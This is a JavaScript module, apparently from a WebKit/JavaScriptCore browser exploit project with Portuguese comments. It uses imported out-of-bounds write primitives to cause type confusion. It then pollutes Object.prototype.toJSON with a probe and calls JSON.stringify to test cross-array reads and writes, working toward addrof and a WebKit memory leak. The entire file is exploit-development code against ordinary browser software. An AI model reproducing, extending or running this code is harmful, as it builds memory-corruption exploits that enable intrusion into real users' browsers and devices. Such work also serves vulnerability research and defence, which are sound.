// js/script3/testArrayBufferVictimCrash.mjs (R43L - Leitura Cruzada Pós-TC)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_CrossReadPostTC";

const VICTIM_ARRAY_SIZE_ELEMENTS = 8; // Tamanho dos TypedArrays em elementos Uint32
const VICTIM_BUFFER_SIZE_BYTES = VICTIM_ARRAY_SIZE_ELEMENTS * 4;

const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE = 0x7C; // Offset que causa TC
const OOB_WRITE_VALUE_FOR_TC = 0xABABABAB;

const PATTERN_A_VICTIM = 0xA1A1A1A1;
const PATTERN_B_MARKER = 0xB2B2B2B2;
const PATTERN_C_WRITE_TEST = 0xC3C3C3C3;

const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak; // Ainda mantido para estrutura do WebKitLeak, se addrof for alcançado
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}

// Função auxiliar para logar o conteúdo de um TypedArray
function logTypedArrayContent(ta, name = "TypedArray", maxElements = 8) {
    if (!ta || typeof ta.slice !== 'function') {
        logS3(`[logTypedArrayContent] ${name} é inválido ou não é um TypedArray.`, "warn");
        return "N/A";
    }
    const content = Array.from(ta.slice(0, Math.min(ta.length, maxElements))).map(v => `0x${v.toString(16)}`);
    logS3(`[logTypedArrayContent] Conteúdo de ${name} (primeiros ${maxElements}): [${content.join(", ")}]`, "leak_detail");
    return `[${content.join(", ")}]`;
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Leitura Cruzada Pós-TC ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init CrossRead...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_CrossRead() { return `target_R43L_CrossRead_${Date.now()}`; };

    logS3(`--- Fase 0 (CrossRead): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { /* ... (sanity check - sem alterações) ... */
        coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3);
        logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    } catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) { /* ... (retorno de erro do sanity check - sem alterações) ... */
        return { errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, stringifyResult: null, addrof_result: { success: false, msg: "Addrof (CrossRead): Not run.", /*...*/ }, webkit_leak_result: { success: false, msg: "WebKit Leak (CrossRead): Not run.", /*...*/ }, iteration_results_summary: [], total_probe_calls_last_iter: 0, oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, cross_read_analysis: null };
    }

    let iteration_results_summary = []; // Embora seja uma única "iteração" de offset/valor OOB
    let best_result_for_runner = { // Renomeado para clareza, pois não há "melhor" de múltiplas iterações aqui
        errorOccurred: null, tc_probe_details: null, stringifyResult: null,
        addrof_result: { success: false, msg: "Addrof (CrossRead): Não tentado ativamente.", /*...*/ },
        webkit_leak_result: { success: false, msg: "WebKit Leak (CrossRead): Não tentado.", /*...*/ },
        oob_params_used: { offset: toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: toHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        cross_read_analysis: null // Novo campo para resultados da análise de leitura cruzada
    };
    let final_probe_call_count_for_report = 0;


    // Variáveis da closure da sonda precisam ser acessíveis
    let victim_typed_array_for_tc_trigger = null; // O que vai para JSON.stringify
    let marker_M1_ref_iter = null;
    let marker_M2_typed_array_ref_iter = null; // Agora M2 também é um TypedArray

    let cross_read_details_from_probe = {
        notes: "Não executado",
        victim_content_in_tc: "N/A",
        marker_m2_content_in_tc_before_write: "N/A",
        marker_m2_content_in_tc_after_write: "N/A",
        write_test_successful: null
    };

    let probe_call_count_iter = 0;
    let iteration_final_tc_details_from_probe = null;
    let iteration_tc_first_detection_done = false;
    let heisenbugConfirmedThisIter = false;

    // Definir a sonda
    function toJSON_TA_Probe_Iter_Closure_CrossRead() {
        probe_call_count_iter++; const call_num = probe_call_count_iter;
        const ctts = Object.prototype.toString.call(this);
        // `this` deve ser `marker_M2_typed_array_ref_iter` na chamada de TC
        const is_m2c = (this === marker_M2_typed_array_ref_iter && marker_M2_typed_array_ref_iter !== null);

        try {
            if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };

            if (call_num === 1 && this === victim_typed_array_for_tc_trigger) {
                // 1. Setup (Primeira chamada da sonda)
                logS3(`[PROBE_CrossRead] Call #${call_num}: 'this' é victim_typed_array_for_tc_trigger. Configurando marcadores...`, "debug");
                marker_M2_typed_array_ref_iter = new Uint32Array(VICTIM_ARRAY_SIZE_ELEMENTS);
                marker_M2_typed_array_ref_iter.fill(PATTERN_B_MARKER);
                logS3(`   marker_M2_typed_array_ref_iter criado e preenchido com PATTERN_B.`, "debug_detail");
                logTypedArrayContent(marker_M2_typed_array_ref_iter, "marker_M2_typed_array_ref_iter (setup)");

                marker_M1_ref_iter = { marker_id_cross_read: "M1_CrossRead", payload_M2_TA: marker_M2_typed_array_ref_iter };
                return marker_M1_ref_iter;

            } else if (is_m2c) { // `this` é marker_M2_typed_array_ref_iter
                if (!iteration_tc_first_detection_done) {
                    iteration_tc_first_detection_done = true;
                    heisenbugConfirmedThisIter = true;
                    iteration_final_tc_details_from_probe = {
                        call_number_tc_detected: call_num, probe_variant: "TA_Probe_CrossRead",
                        this_type_expected: "[object Uint32Array]", this_type_actual: ctts,
                        this_is_M2_TA: true, notes: "TC Confirmada. Iniciando análise de leitura cruzada."
                    };
                    logS3(`[PROBE_CrossRead] Call #${call_num} (M2C): FIRST TC. 'this' é marker_M2_typed_array_ref_iter (tipo: ${ctts}).`, "vuln");

                    // 4. Tentativa de Leitura Cruzada
                    logS3(`   [CrossRead Analysis] Lendo victim_typed_array_for_tc_trigger (escopo da closure) DENTRO da TC:`, "info_emphasis");
                    cross_read_details_from_probe.victim_content_in_tc = logTypedArrayContent(victim_typed_array_for_tc_trigger, "victim_typed_array_for_tc_trigger (in TC)");

                    logS3(`   [CrossRead Analysis] Lendo 'this' (marker_M2_typed_array_ref_iter) ANTES da escrita de teste:`, "info_emphasis");
                    cross_read_details_from_probe.marker_m2_content_in_tc_before_write = logTypedArrayContent(this, "'this' (marker_M2_TA, before write test)");
                    
                    // 5. Tentativa de Escrita Cruzada (CUIDADO)
                    //    Escrever no victim_typed_array_for_tc_trigger e ver se afeta 'this' (marker_M2_typed_array_ref_iter)
                    try {
                        logS3(`   [CrossRead Analysis] Escrevendo PATTERN_C em victim_typed_array_for_tc_trigger[0]...`, "warn");
                        if (victim_typed_array_for_tc_trigger && victim_typed_array_for_tc_trigger.length > 0) {
                            victim_typed_array_for_tc_trigger[0] = PATTERN_C_WRITE_TEST;
                            logS3(`     victim_typed_array_for_tc_trigger[0] agora é 0x${victim_typed_array_for_tc_trigger[0].toString(16)}`, "leak_detail");

                            logS3(`   [CrossRead Analysis] Lendo 'this' (marker_M2_typed_array_ref_iter) APÓS escrita em victim_typed_array:`, "info_emphasis");
                            cross_read_details_from_probe.marker_m2_content_in_tc_after_write = logTypedArrayContent(this, "'this' (marker_M2_TA, after write test)");

                            if (this.length > 0 && this[0] === PATTERN_C_WRITE_TEST) {
                                cross_read_details_from_probe.notes = "SUCESSO NA ESCRITA CRUZADA! victim_typed_array parece controlar marker_M2_typed_array.";
                                cross_read_details_from_probe.write_test_successful = true;
                                logS3(`     !!! SUCESSO ESCRITA CRUZADA: this[0] (marker_M2) é 0x${this[0].toString(16)} !!!`, "success_major");
                            } else {
                                cross_read_details_from_probe.notes = "Falha na escrita cruzada ou sem sobreposição óbvia.";
                                cross_read_details_from_probe.write_test_successful = false;
                                logS3(`     Escrita cruzada não refletida em this[0] (marker_M2): 0x${this.length > 0 ? this[0].toString(16) : 'N/A'}`, "warn");
                            }
                        } else {
                             cross_read_details_from_probe.notes = "victim_typed_array_for_tc_trigger inválido para teste de escrita.";
                             logS3(`     victim_typed_array_for_tc_trigger inválido para teste de escrita.`, "error");
                        }
                    } catch (e_write_test) {
                        cross_read_details_from_probe.notes = `Erro durante teste de escrita cruzada: ${e_write_test.message}`;
                        cross_read_details_from_probe.write_test_successful = "exception";
                        logS3(`   [CrossRead Analysis] Erro no teste de escrita cruzada: ${e_write_test.message}`, "error");
                    }
                }
                return this; // Para JSON.stringify continuar (e não tentar acessar propriedades inexistentes que causem erro)
            }
        } catch (e_pm) { /* ... (tratamento de erro da sonda) ... */
            iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErr:${e_pm.message}` };
            console.error("[PROBE_CrossRead] Erro:", e_pm); return { err_pm: call_num, msg: e_pm.message };
        }
        return { gen_m: call_num, type: ctts };
    }


    let iter_primary_error = null;
    let iter_raw_stringify_output = null;
    let iter_stringify_output_parsed = null;

    try {
        logS3(`  --- Fase 1 (CrossRead): Configuração e Trigger da TC ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        // 2. Criar victim_typed_array_for_tc_trigger ANTES da escrita OOB
        victim_typed_array_for_tc_trigger = new Uint32Array(VICTIM_ARRAY_SIZE_ELEMENTS);
        victim_typed_array_for_tc_trigger.fill(PATTERN_A_VICTIM);
        logS3(`   victim_typed_array_for_tc_trigger criado e preenchido com PATTERN_A.`, "info");
        logTypedArrayContent(victim_typed_array_for_tc_trigger, "victim_typed_array_for_tc_trigger (initial)");

        await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_TEST_BASE}-OOBSetup` });
        // 3. Escrita OOB
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE, OOB_WRITE_VALUE_FOR_TC, 4);
        logS3(`   OOB Write: Escrito valor ${toHex(OOB_WRITE_VALUE_FOR_TC)} no offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE)}`, 'info');
        await PAUSE_S3(150); // Pausa para Heisenbug

        // 4. Trigger JSON.stringify
        logS3(`  --- Tentativa de Detecção de TC e Leitura Cruzada (CrossRead) ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_CrossRead, writable: true, configurable: true, enumerable: false });
            polluted = true;
            iter_raw_stringify_output = JSON.stringify(victim_typed_array_for_tc_trigger); // Este é o objeto que vai para a sonda na primeira chamada
            try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { iter_stringify_output_parsed = { err_parse: iter_raw_stringify_output, msg: e_p.message }; }

            if (heisenbugConfirmedThisIter) {
                logS3(`  TC Probe (CrossRead): TC on M2_TA CONFIRMADA. Detalhes da leitura cruzada registrados.`, "vuln", FNAME_CURRENT_TEST_BASE);
            } else {
                logS3(`  TC Probe (CrossRead): TC on M2_TA NÃO Confirmada. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "warn", FNAME_CURRENT_TEST_BASE);
            }
        } catch (e_str) {
            if (!iter_primary_error) iter_primary_error = e_str;
            logS3(`  TC Probe (CrossRead): JSON.stringify EXCEPTION: ${e_str.message}`, "error", FNAME_CURRENT_TEST_BASE);
        } finally {
            if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; }
        }
        logS3(`  --- Fase de TC e Leitura Cruzada Concluída. TC M2_TA: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_TEST_BASE);

    } catch (e_outer_iter) {
        if (!iter_primary_error) iter_primary_error = e_outer_iter;
        logS3(`  CRITICAL ERROR ITERATION CrossRead: ${e_outer_iter.message || String(e_outer_iter)}`, "critical", FNAME_CURRENT_TEST_BASE);
    } finally {
        await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_TEST_BASE}-FinalClearCrossRead` });
    }

    final_probe_call_count_for_report = probe_call_count_iter;

    // Sumarizar resultados
    best_result_for_runner = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        tc_probe_details: iteration_final_tc_details_from_probe,
        stringifyResult: iter_stringify_output_parsed,
        addrof_result: { success: false, msg: "Addrof (CrossRead): Não tentado ativamente." }, // Manter estrutura
        webkit_leak_result: { success: false, msg: "WebKit Leak (CrossRead): Não tentado." }, // Manter estrutura
        oob_params_used: { offset: toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC_PROBE), value: toHex(OOB_WRITE_VALUE_FOR_TC) },
        heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter,
        cross_read_analysis: cross_read_details_from_probe // Adicionar detalhes da análise
    };
    iteration_results_summary.push({...best_result_for_runner, oob_value: toHex(OOB_WRITE_VALUE_FOR_TC) }); // Para o log do runner

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (CrossRead Analysis): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
     if (best_result_for_runner.cross_read_analysis?.write_test_successful === true) {
        final_title_status = "Cross-Write SUCCESS!";
    } else if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) {
        final_title_status = "TC Confirmed, Cross-Write Fail/Untested";
    } else if (best_result_for_runner.errorOccurred) {
        final_title_status = `Error - ${best_result_for_runner.errorOccurred}`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return { // Adaptar para o runner
        errorOccurred: best_result_for_runner.errorOccurred,
        tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult,
        addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result,
        iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_params_used.value, // Para compatibilidade com runner
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        // Campos adicionais se o runner for adaptado
        oob_params_detailed_best_result: best_result_for_runner.oob_params_used,
        cross_read_analysis_best_result: best_result_for_runner.cross_read_analysis
    };
}
